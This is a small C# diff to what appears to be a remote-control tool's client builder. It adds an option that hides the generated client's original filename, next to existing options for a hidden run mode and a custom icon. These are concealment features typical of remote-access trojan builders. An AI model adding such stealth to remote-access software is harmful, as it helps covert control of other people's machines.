@@ -87,6 +87,7 @@ namespace RemoteControl.Server
                 return;
             string serviceName = this.textBoxServiceName.Text.Trim();
             string avatar = this.pictureBoxAvatar.Tag.ToString();
+            bool showOriginalFilename = this.checkBoxShowOriginalFileName.Checked;
 
             // 保存配置
             this.buttonSaveServerSetting.PerformClick();
@@ -127,6 +128,11 @@ namespace RemoteControl.Server
                 // 修改启动模式
                 ClientParametersManager.WriteClientStyle(fileBytes,
                     this.checkBoxHideClient.Checked ? ClientParametersManager.ClientStyle.Hidden : ClientParametersManager.ClientStyle.Normal);
+                if (!showOriginalFilename)
+                {
+                    // 隐藏原始文件名
+                    ClientParametersManager.HideOriginalFilename(fileBytes);
+                }
                 // 修改参数
                 ClientParametersManager.WriteParameters(fileBytes, dialog.FileName, para);
                 MsgBox.Info("客户端生成成功！");
